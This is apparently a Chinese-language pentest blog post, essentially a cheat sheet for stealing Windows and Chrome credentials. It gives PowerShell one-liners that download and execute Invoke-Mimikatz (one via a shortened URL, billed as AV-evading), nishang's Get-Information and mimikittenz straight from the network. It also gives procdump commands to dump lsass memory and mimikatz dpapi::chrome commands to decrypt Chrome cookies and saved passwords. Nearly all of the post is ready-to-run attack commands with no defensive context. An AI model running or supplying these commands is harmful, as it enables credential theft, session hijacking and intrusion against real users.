---
layout:     post
title:       Mimikatz读取chrome浏览器cookies，password
subtitle:   Mimikatz读取密码
date:       2020-06-29
author:     BugMan
header-img: img/post-bg-hacker.jpg
catalog: true
tags:
    - google
    - 渗透测试

---
### 1.2免杀抓取密码的两种方式

```
powershell "IEX (New-Object Net.WebClient).DownloadString('http://is.gd/oeoFuI'); Invoke-Mimikatz -DumpCreds"
tips:powershell 默认windows visa后才有
```

procdump lsass 进程导出技巧
C:\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp //For 32 bits

C:\temp\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp //For 64 bits
然后本地使用mimikatz 还原密码
### mimikatz 读取chrome cookies

```
mimikatz.exe privilege::debug log "dpapi::chrome /in:%localappdata%\google\chrome\USERDA~1\default\cookies /unprotect" exit

mimikatz.exe privilege::debug log "dpapi::chrome /in:%localappdata%\google\chrome\USERDA~1\default\USERDA~1" exit

mimikatz.exe privilege::debug log "dpapi::chrome /in:%localappdata%\google\chrome\USERDA~1\default\LOGIND~1" exit //读chrome密码
```
### powershell 常用工具的信息收集工具

FTP访问、共享连接、putty连接 驱动、应用程序、hosts 文件、进程、无线网络记录

```
powershell "IEX (New-Object Net.WebClient).DownloadString(' https://github.com/samratashok/nishang/tree/master/Gather/Gather/Get-Information.ps1'); Get-Information"
```

正则过滤进程密码，已测windows7

```
powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/putterpanda/mimikittenz/master/Invoke-mimikittenz.ps1'); Invoke-mimikittenz

sqlserver密码获取工具Get-MSSQLCredentialPasswords.psm1 //未测
```



